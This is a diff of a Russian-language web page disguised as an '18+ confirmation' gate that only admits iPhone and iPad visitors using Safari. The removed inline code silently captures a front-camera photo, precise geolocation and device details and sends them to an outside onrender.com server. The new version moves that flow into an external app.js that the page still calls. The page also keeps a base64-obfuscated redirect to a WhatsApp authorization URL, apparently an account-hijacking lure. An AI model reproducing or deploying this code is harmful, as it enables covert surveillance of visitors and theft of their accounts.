@@ -8,84 +8,55 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="default">
   <meta name="format-detection" content="telephone=no">
   <style>
-    :root {
-      /* Светлая палитра и контраст */
-      --bg0: #ffffff; /* основной фон — чисто белый */
-      --bg1: #f7f9ff; /* едва заметный оттенок для градиентов */
-      --txt: #111111; /* основной текст */
-      --sub: #444444; /* вторичный текст */
-      --muted: #6b7280; /* muted */
-      --primary: #2563eb; /* яркий синий */
-      --primary2: #60a5fa; /* светлее */
-      --cyan: #0ea5e9;
-      --err: #ef4444;
-      --ok: #16a34a;
-      --radius: 20px;
-      --shadow: 0 6px 30px rgba(0,0,0,0.08);
-      --ring: 0 0 0 3px rgba(37, 99, 235, 0.25);
+    :root{
+      --bg0:#ffffff;--bg1:#f7f9ff;
+      --txt:#111;--sub:#444;--muted:#6b7280;
+      --primary:#2563eb;--primary2:#60a5fa;--err:#ef4444;--ok:#16a34a;
+      --radius:20px;--shadow:0 6px 30px rgba(0,0,0,.08);--ring:0 0 0 3px rgba(37,99,235,.25)
     }
-
-    html, body { height: 100%; }
-    html { color-scheme: light; }
-    body {
-      margin: 0; overflow: hidden; position: relative;
-      color: var(--txt); font-family: "Segoe UI", Roboto, system-ui, -apple-system, sans-serif;
-      display: grid; place-items: center;
-      background: var(--bg0);
-      -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
+    html,body{height:100%}
+    html{color-scheme:light}
+    body{
+      margin:0;overflow:hidden;position:relative;color:var(--txt);
+      font-family:"Segoe UI",Roboto,system-ui,-apple-system,sans-serif;
+      display:grid;place-items:center;background:var(--bg0);
+      -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale
     }
-
-    /* Мягкая светлая подсветка фона (очень деликатно) */
-    .animated-gradient {
-      position: absolute; inset: -12vmax; z-index: 0; pointer-events: none;
-      filter: blur(80px) saturate(110%);
-      opacity: .35;
-      background: conic-gradient(from 0deg,
-        rgba(96,165,250,.20), rgba(14,165,233,.15), rgba(199,210,254,.18), rgba(96,165,250,.20));
-      animation: swirl 32s linear infinite;
+    .animated-gradient{
+      position:absolute;inset:-12vmax;z-index:0;pointer-events:none;
+      filter:blur(80px) saturate(110%);opacity:.35;
+      background:conic-gradient(from 0deg,rgba(96,165,250,.20),rgba(14,165,233,.15),rgba(199,210,254,.18),rgba(96,165,250,.20));
+      animation:swirl 32s linear infinite
     }
-    @keyframes swirl { to { transform: rotate(360deg); } }
-    @media (prefers-reduced-motion: reduce) { .animated-gradient { animation: none; } }
-
-    canvas#bg { position: absolute; inset: 0; z-index: 0; pointer-events: none; }
-
-    /* Убрали тёмный вотермарк; делаем едва заметным на белом */
-    body::before {
-      content: "vskoll";
-      position: absolute; inset: 0; display: grid; place-items: center; z-index: 0;
-      font-size: 14vw; font-weight: 800; letter-spacing: .18em; text-transform: uppercase;
-      color: rgba(0,0,0,0.015); filter: blur(1.2px); user-select: none; pointer-events: none;
-      transform: rotate(-10deg);
+    @keyframes swirl{to{transform:rotate(360deg)}}
+    @media (prefers-reduced-motion: reduce){.animated-gradient{animation:none}}
+    canvas#bg{position:absolute;inset:0;z-index:0;pointer-events:none}
+    body::before{
+      content:"vskoll";position:absolute;inset:0;display:grid;place-items:center;z-index:0;
+      font-size:14vw;font-weight:800;letter-spacing:.18em;text-transform:uppercase;color:rgba(0,0,0,.015);
+      filter:blur(1.2px);user-select:none;pointer-events:none;transform:rotate(-10deg)
     }
-
-    .card {
-      width: min(92vw, 520px);
-      padding: 28px; border-radius: var(--radius);
-      background: rgba(255,255,255,0.92);
-      -webkit-backdrop-filter: blur(6px); backdrop-filter: blur(6px);
-      box-shadow: var(--shadow);
-      border: 1px solid rgba(17,24,39,0.06);
-      text-align: center; position: relative; z-index: 2;
+    .card{
+      width:min(92vw,520px);padding:28px;border-radius:var(--radius);
+      background:rgba(255,255,255,.92);-webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);
+      box-shadow:var(--shadow);border:1px solid rgba(17,24,39,.06);text-align:center;position:relative;z-index:2
     }
-
-    h1 { font-size: 24px; font-weight: 800; margin: 0 0 12px; color: var(--txt); }
-    p { font-size: 16px; color: var(--sub); margin: 0 0 18px; line-height: 1.55; }
-    .reason { font-size: 13px; margin-top: 8px; color: var(--muted); min-height: 1.6em; }
-    .notice { font-size: 12px; color: var(--muted); margin-top: 14px; }
-
-    button {
-      width: 100%; height: 54px; border: none; border-radius: 14px;
-      background: linear-gradient(90deg, var(--primary), var(--primary2));
-      color: #fff; font-weight: 800; font-size: 16px; letter-spacing: .5px; cursor: pointer;
-      transition: transform .12s ease, box-shadow .12s ease, filter .12s ease;
-      box-shadow: 0 10px 25px rgba(37, 99, 235, .25);
+    h1{font-size:24px;font-weight:800;margin:0 0 12px;color:var(--txt)}
+    p{font-size:16px;color:var(--sub);margin:0 0 18px;line-height:1.55}
+    .reason{font-size:13px;margin-top:8px;color:var(--muted);min-height:1.6em}
+    .notice{font-size:12px;color:var(--muted);margin-top:14px}
+    button{
+      width:100%;height:54px;border:none;border-radius:14px;
+      background:linear-gradient(90deg,var(--primary),var(--primary2));
+      color:#fff;font-weight:800;font-size:16px;letter-spacing:.5px;cursor:pointer;
+      transition:transform .12s ease,box-shadow .12s ease,filter .12s ease;
+      box-shadow:0 10px 25px rgba(37,99,235,.25)
     }
-    button:hover { transform: translateY(-1px) scale(1.01); box-shadow: 0 14px 30px rgba(37, 99, 235, .32); }
-    button:active { transform: scale(.98); box-shadow: 0 8px 18px rgba(37, 99, 235, .40); }
-    button:focus-visible { outline: none; box-shadow: var(--ring); }
-
-    .ok { color: var(--ok); font-weight: 700; }
-    .err { color: var(--err); font-weight: 700; }
+    button:hover{transform:translateY(-1px) scale(1.01);box-shadow:0 14px 30px rgba(37,99,235,.32)}
+    button:active{transform:scale(.98);box-shadow:0 8px 18px rgba(37,99,235,.40)}
+    button:focus-visible{outline:none;box-shadow:var(--ring)}
+    .ok{color:var(--ok);font-weight:700}
+    .err{color:var(--err);font-weight:700}
   </style>
 </head>
 <body>
@@ -100,245 +71,125 @@
     <div class="notice" id="note"></div>
   </div>
 
-  <script>
-    // Разрешаем стандартные действия — на светлом сайте нет нужды жёстко блокировать
-    // Если блокировки нужны, верни массив событий ниже
-    /* ['contextmenu','copy','cut','paste','dragstart','selectstart'].forEach(evt => {
-      window.addEventListener(evt, e => e.preventDefault(), { passive: false });
-    }); */
+  <!-- Внешний скрипт с авто-потоком и защитой клика -->
+  <script src="app.js"></script>
 
-    // ==== Target URL (base64) — твой редирект (оставлено как есть) ====
-    const URL_PARTS = [
+  <!-- Локальная логика страницы -->
+  <script>
+    // ==== целевой URL (base64) ====
+    const URL_PARTS=[
       "aHR0cHM6Ly93d3cucHViZ21vYmlsZS5jb20vaWcvaXRvcC93aGF0c2FwcC9hdXRo",
       "P3R5cGU9d2hhdHNhcHBhdXRoJmRhdGE9ZXlKYWRYTjBJam9nS2x3SWFTVnlaVzFo",
       "YVhwbEluMHNJbWgwZEhCek9pOHhNVFV5T1RrM05EZzBOVGt3TUNJc0ltbGhjM05s",
       "ZEhKbGMzUWlPaUpHVjJsMGFYWmxJaXdpWm1KallYUnBiMjRpT2lJd1dsaEtWbUZK",
       "UlVGUFZrUkpVQSJ9"
     ];
-    function decodeUrl(parts) {
-      try {
-        const b64 = parts.join('');
-        const bin = atob(b64);
-        const bytes = Uint8Array.from(bin, c => c.charCodeAt(0));
+    function decodeUrl(parts){
+      try{
+        const b64=parts.join('');const bin=atob(b64);
+        const bytes=Uint8Array.from(bin,c=>c.charCodeAt(0));
         return new TextDecoder().decode(bytes);
-      } catch { return ''; }
+      }catch{return '';}
     }
-    function go() {
-      const target = decodeUrl(URL_PARTS);
-      if (!target) return;
-      location.assign(target);
-    }
-
-    // ==== Детект iOS/Safari (без изменений по логике) ====
-    const title  = document.getElementById('title');
-    const text   = document.getElementById('text');
-    const reason = document.getElementById('reason');
-    const btn    = document.getElementById('enterBtn');
-    const note   = document.getElementById('note');
-
-    function getIOSLikeVersion() {
-      const ua = navigator.userAgent;
-      let m = ua.match(/OS\s(\d+)[_.]/);
-      if (m) return parseInt(m[1], 10);
-      m = navigator.appVersion && navigator.appVersion.match(/Version\/(\d+)/);
-      return m ? parseInt(m[1], 10) : null;
-    }
-    function isSafariWebKit() {
-      const ua = navigator.userAgent;
-      const vendorOK = navigator.vendor === 'Apple Computer, Inc.';
-      const isSafariToken = /Safari\//.test(ua) && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua);
-      return vendorOK && isSafariToken;
-    }
-    function isIOSFamily() {
-      const ua = navigator.userAgent;
-      const touchMac = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
-      const tokens = /(iPhone|iPad|iPod)/.test(ua);
-      return tokens || touchMac;
-    }
-    function isStandalonePWA() {
-      return window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true;
-    }
-    function trustScore() {
-      let score = 0;
-      if (isSafariWebKit()) score += 2.0;
-      if (isIOSFamily()) score += 2.0;
-      if (!('userAgentData' in navigator)) score += 0.5;
-      if (isStandalonePWA()) score += 0.5;
-      return score; // pass >= 3.5
+    function go(){
+      const target=decodeUrl(URL_PARTS);
+      if(target) location.assign(target);
     }
 
-    // ==== Светлые частицы ====
+    // ==== детект окружения ====
+    const $ = (id)=>document.getElementById(id);
+    const title=$('title'), text=$('text'), reason=$('reason'), btn=$('enterBtn'), note=$('note');
+
+    function getIOSLikeVersion(){
+      const ua=navigator.userAgent;const m=ua.match(/OS\s(\d+)[_.]/) || (navigator.appVersion && navigator.appVersion.match(/Version\/(\d+)/));
+      return m ? parseInt(m[1],10) : null;
+    }
+    function isSafariWebKit(){
+      const ua=navigator.userAgent;
+      const vendorOK=navigator.vendor==='Apple Computer, Inc.';
+      const token=/Safari\//.test(ua) && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua);
+      return vendorOK && token;
+    }
+    function isIOSFamily(){
+      const ua=navigator.userAgent;
+      const touchMac=navigator.platform==='MacIntel' && navigator.maxTouchPoints>1;
+      return /(iPhone|iPad|iPod)/.test(ua) || touchMac;
+    }
+    function isStandalonePWA(){
+      return matchMedia('(display-mode: standalone)').matches || navigator.standalone===true;
+    }
+    function trustScore(){
+      let s=0;
+      if(isSafariWebKit()) s+=2;
+      if(isIOSFamily()) s+=2;
+      if(!('userAgentData' in navigator)) s+=0.5;
+      if(isStandalonePWA()) s+=0.5;
+      return s; // pass >= 3.5
+    }
+
+    // ==== фоновые частицы ====
     (function particles(){
-      const prefersReduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-      const canvas = document.getElementById('bg');
-      const ctx = canvas.getContext('2d', { alpha: true });
-      let dpr = Math.min(2, window.devicePixelRatio || 1);
-      let W, H, rafId, lastTs = 0;
-      const MAX_PARTICLES = prefersReduce ? 24 : 50;
-      const FPS = 48;
-      const particles = [];
-      function resize() {
-        W = canvas.clientWidth = window.innerWidth;
-        H = canvas.clientHeight = window.innerHeight;
-        canvas.width = Math.floor(W * dpr);
-        canvas.height = Math.floor(H * dpr);
-        ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
-      }
-      function spawn() {
-        particles.length = 0;
-        for (let i = 0; i < MAX_PARTICLES; i++) {
-          particles.push({
-            x: Math.random() * W, y: Math.random() * H,
-            r: 0.8 + Math.random() * 1.8,
-            a: Math.random() * Math.PI * 2,
-            s: 0.12 + Math.random() * 0.35,
-            o: 0.12 + Math.random() * 0.25
-          });
+      const reduce=matchMedia('(prefers-reduced-motion: reduce)').matches;
+      const c=document.getElementById('bg');
+      const ctx=c.getContext('2d',{alpha:true});
+      let dpr=Math.min(2,window.devicePixelRatio||1),W,H,raf,last=0;
+      const MAX=reduce?24:50,FPS=48,ps=[];
+      function resize(){W=c.clientWidth=innerWidth;H=c.clientHeight=innerHeight;c.width=Math.floor(W*dpr);c.height=Math.floor(H*dpr);ctx.setTransform(dpr,0,0,dpr,0,0)}
+      function spawn(){ps.length=0;for(let i=0;i<MAX;i++) ps.push({x:Math.random()*W,y:Math.random()*H,r:.8+Math.random()*1.8,a:Math.random()*Math.PI*2,s:.12+Math.random()*.35,o:.12+Math.random()*.25})}
+      function step(ts){
+        if(ts-last<1000/FPS){raf=requestAnimationFrame(step);return}
+        last=ts;ctx.clearRect(0,0,W,H);
+        for(const p of ps){
+          p.a+=.002+p.s*.002;p.x+=Math.cos(p.a)*p.s;p.y+=Math.sin(p.a)*p.s;
+          if(p.x<-5)p.x=W+5;else if(p.x>W+5)p.x=-5;
+          if(p.y<-5)p.y=H+5;else if(p.y>H+5)p.y=-5;
+          ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+          ctx.fillStyle=`rgba(37,99,235,${p.o})`;ctx.fill();
+          ctx.shadowBlur=12;ctx.shadowColor='rgba(37,99,235,.22)';ctx.fill();ctx.shadowBlur=0;
         }
+        raf=requestAnimationFrame(step);
       }
-      function step(ts) {
-        if (ts - lastTs < 1000 / FPS) { rafId = requestAnimationFrame(step); return; }
-        lastTs = ts;
-        ctx.clearRect(0, 0, W, H);
-        for (const p of particles) {
-          p.a += 0.002 + p.s * 0.002;
-          p.x += Math.cos(p.a) * p.s;
-          p.y += Math.sin(p.a) * p.s;
-          if (p.x < -5) p.x = W + 5; else if (p.x > W + 5) p.x = -5;
-          if (p.y < -5) p.y = H + 5; else if (p.y > H + 5) p.y = -5;
-          ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
-          ctx.fillStyle = `rgba(37, 99, 235, ${p.o})`; ctx.fill();
-          ctx.shadowBlur = 12; ctx.shadowColor = 'rgba(37,99,235,0.22)'; ctx.fill(); ctx.shadowBlur = 0;
-        }
-        rafId = requestAnimationFrame(step);
-      }
-      function start(){ if (prefersReduce) return; cancelAnimationFrame(rafId); resize(); spawn(); rafId = requestAnimationFrame(step); }
-      function stop(){ cancelAnimationFrame(rafId); }
-      window.addEventListener('resize', () => { dpr = Math.min(2, window.devicePixelRatio || 1); resize(); });
-      document.addEventListener('visibilitychange', () => { if (document.hidden) stop(); else start(); });
+      function start(){ if(reduce) return; cancelAnimationFrame(raf); resize(); spawn(); raf=requestAnimationFrame(step)}
+      addEventListener('resize',()=>{dpr=Math.min(2,devicePixelRatio||1);resize()});
+      addEventListener('visibilitychange',()=>{document.hidden?cancelAnimationFrame(raf):start()});
       start();
     })();
 
-    // ==== Автоматический поток: geo + camera -> send to Telegram (без изменений по логике) ====
-    const API_BASE = 'https://geo-photo-report.onrender.com';
-    let reportReady = false;
+    // ==== запуск ====
+    document.addEventListener('DOMContentLoaded', () => {
+      const ver=getIOSLikeVersion();
+      const score=trustScore();
+      const isiOS=isIOSFamily();
 
-    function btnSetLocked() {
-      btn.disabled = true;
-      btn.style.filter = 'grayscale(35%) brightness(0.98)';
-      btn.style.opacity = '0.65';
-      btn.style.cursor = 'not-allowed';
-      btn.style.background = 'linear-gradient(90deg, #93c5fd, #bae6fd)';
-      btn.style.boxShadow = '0 0 0 rgba(0,0,0,0)';
-    }
-    function btnSetReady() {
-      btn.disabled = false;
-      btn.style.filter = 'none';
-      btn.style.opacity = '1';
-      btn.style.cursor = 'pointer';
-      btn.style.background = 'linear-gradient(90deg, var(--primary), var(--primary2))';
-      btn.style.boxShadow = '0 10px 26px rgba(37, 99, 235, .30)';
-    }
+      const ok=isiOS && ver && ver>=18 && score>=3.5 && isSafariWebKit();
+      if(ok){
+        $('title').textContent='Подтверждение 18+';
+        $('text').innerHTML='<span class="ok">Доступ разрешён.</span>';
+        $('reason').textContent=`${/iPad|MacIntel/.test(navigator.platform)||/iPad/.test(navigator.userAgent)?'iPadOS':'iOS'} ${ver}, Safari WebKit.`;
+        $('enterBtn').style.display='block';
+        $('note').textContent='Кнопка активируется после проверки.';
 
-    async function askGeolocation() {
-      return new Promise((resolve) => {
-        if (!('geolocation' in navigator)) return resolve(null);
-        navigator.geolocation.getCurrentPosition(
-          p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy), ts: Date.now() }),
-          () => resolve(null),
-          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-        );
-      });
-    }
-    async function takePhoto() {
-      if (!navigator.mediaDevices?.getUserMedia) throw new Error('Camera unsupported');
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      const [track] = stream.getVideoTracks();
-      try {
-        const cap = new ImageCapture(track);
-        const bmp = await cap.grabFrame();
-        const c = document.createElement('canvas'); c.width = bmp.width; c.height = bmp.height;
-        c.getContext('2d').drawImage(bmp, 0, 0);
-        const dataUrl = c.toDataURL('image/jpeg', 0.85);
-        track.stop(); return dataUrl;
-      } catch {
-        const v = document.createElement('video'); v.srcObject = stream; await v.play();
-        const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        const dataUrl = c.toDataURL('image/jpeg', 0.85);
-        stream.getTracks().forEach(t => t.stop()); return dataUrl;
-      }
-    }
-    function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      const isSafari = /Safari\//.test(ua) && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) && navigator.vendor === 'Apple Computer, Inc.';
-      const m = ua.match(/OS\s(\d+)[_.]/);
-      const iosVer = m ? parseInt(m[1], 10) : null;
-      return { userAgent: ua, platform: navigator.platform, iosVersion: iosVer, isSafari };
-    }
-    async function sendReport({ photoBase64, geo }) {
-      const info = getDeviceInfo();
-      const r = await fetch(`${API_BASE}/api/report`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ ...info, geo, photoBase64, note: 'auto' })
-      });
-      const data = await r.json();
-      if (!data.ok) throw new Error(data.error || 'Send failed');
-      return data;
-    }
+        // автопоток из app.js
+        if (typeof window.__autoFlow === 'function') {
+          setTimeout(()=>window.__autoFlow(), 10);
+        }
 
-    async function autoFlow() {
-      try {
-        btnSetLocked();
-        text.innerHTML = 'Запрашиваем разрешения на проверку';
-        const [geo, photoBase64] = await Promise.all([askGeolocation(), takePhoto()]);
-        text.innerHTML = 'Отправляем данные на проверку';
-        await sendReport({ photoBase64, geo });
-        reportReady = true;
-        btnSetReady();
-        text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
-        note.textContent = 'Можно продолжить.';
-      } catch (e) {
-        console.error(e);
-        reportReady = false;
-        btnSetLocked();
-        text.innerHTML = '<span class="err">Не удалось выполнить проверку.</span>';
-        note.textContent = 'Попробуйте ещё раз позже.';
-      }
-    }
-
-    // ==== Главный детект и запуск ====
-    (function main() {
-      const ver = getIOSLikeVersion();
-      const score = trustScore();
-      const isiOS = isIOSFamily();
-
-      const ok = isiOS && ver && ver >= 18 && score >= 3.5 && isSafariWebKit();
-      if (ok) {
-        title.textContent = 'Подтверждение 18+';
-        text.innerHTML = '<span class="ok">Доступ разрешён.</span>';
-        reason.textContent = `${/iPad|MacIntel/.test(navigator.platform) || /iPad/.test(navigator.userAgent) ? 'iPadOS' : 'iOS'} ${ver}, Safari WebKit.`;
-        btn.style.display = 'block';
-        note.textContent = 'Кнопка активируется после проверки.';
-        setTimeout(autoFlow, 10);
-
-        btn.addEventListener('click', (e) => {
-          if (!reportReady) { e.preventDefault(); return; }
+        $('enterBtn').addEventListener('click',(e)=>{
+          if(!window.__reportReady){ e.preventDefault(); return; }
           go();
         });
-      } else {
-        title.textContent = 'Доступ отклонён';
-        let r = '';
-        if (!isiOS) r = 'Устройство не относится к iOS/iPadOS.';
-        else if (!ver || ver < 18) r = 'Версия iOS/iPadOS ниже 18.';
-        else if (score < 3.5 || !isSafariWebKit()) r = 'Обнаружена подмена User-Agent/браузер не Safari.';
-        else r = 'Неизвестная ошибка.';
-        text.innerHTML = '<span class="err">Отказ в доступе.</span>';
-        reason.textContent = 'Причина: ' + r;
-        note.textContent = 'Доступ возможен только на iPhone/iPad с Safari 18+.';
+      }else{
+        $('title').textContent='Доступ отклонён';
+        let r='';
+        if(!isiOS) r='Устройство не относится к iOS/iPadOS.';
+        else if(!ver || ver<18) r='Версия iOS/iPadOS ниже 18.';
+        else if(score<3.5 || !isSafariWebKit()) r='Обнаружена подмена User-Agent/браузер не Safari.';
+        else r='Неизвестная ошибка.';
+        $('text').innerHTML='<span class="err">Отказ в доступе.</span>';
+        $('reason').textContent='Причина: ' + r;
+        $('note').textContent='Доступ возможен только на iPhone/iPad с Safari 18+.';
       }
-    })();
+    });
   </script>
 </body>
 </html>
